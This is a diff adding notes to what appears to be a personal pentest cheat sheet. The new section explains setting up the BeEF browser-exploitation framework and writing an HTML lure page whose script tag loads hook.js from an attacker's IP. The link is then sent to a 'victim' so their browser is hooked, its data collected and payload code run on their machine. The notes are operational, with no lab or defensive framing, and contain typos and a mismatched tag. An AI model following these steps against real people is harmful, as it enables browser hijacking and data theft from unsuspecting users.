@@ -864,6 +864,32 @@ $ wifite
 		- $ service NetworkManager restart
 
 
+####### Social Engineering ########
+
+$ BEEF
+- sudo apt-get install beef-xss
+	- Running 'Beef Start' from apps will run on localhost:3000
+	- To run from network ip
+		- cd usr/shar/beef-xss
+		- sudo ./beef --reset
+			- --reset = will clear db
+			- Use local host IP hook to login in browser
+	- Creating the payload
+		- $ gedit file.html
+			<html>
+			<body>
+			<script src="http://VPLink.IP/hook.js"></script>
+			</body>
+			</script>
+		- Use VPN IP in Hyperlinks as well
+			- ex: http://voc.alh.os.t/file.html
+		- Once link is Clicked
+			- BeEf gets a notice from the VPN hook ip in script tag
+			- Collects info in browser consel of victim
+			- Payload code and ran on victim machine
+
+
+
 $ Juice Shop
 - TODO: 
 
